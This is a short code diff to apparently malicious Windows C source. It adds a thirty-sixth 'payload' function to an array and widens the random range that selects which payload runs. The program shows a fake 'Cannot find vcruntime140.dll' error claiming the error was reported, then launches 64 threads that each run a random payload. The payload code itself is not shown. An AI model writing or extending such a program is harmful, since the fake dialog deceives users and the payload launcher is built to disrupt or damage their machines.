@@ -97,7 +97,8 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         p32,
         p33,
         p34,
-        p35
+        p35,
+        p36
     }; // use: payloads[x]() for function px(). why use this? functions in random order, im still working on porting all payloads to payloads.h
     
     DWORD zero = 0;
@@ -114,6 +115,8 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
 
     MSGBOXPARAMS msglol = { 0 };
     msglol.cbSize = sizeof(MSGBOXPARAMS);
+
+
     msglol.hwndOwner = NULL;
     msglol.hInstance = GetModuleHandle(NULL);
     msglol.lpszText = "Cannot find vcruntime140.dll. Click OK to terminate the program. This error has been reported.";
@@ -257,7 +260,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     }
 
     fori(64) {
-        int r = rand() % 35 + 1;
+        int r = rand() % 36 + 1;
         CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[r], NULL, 0, NULL);
         Sleep(rand() % 5000);
     }
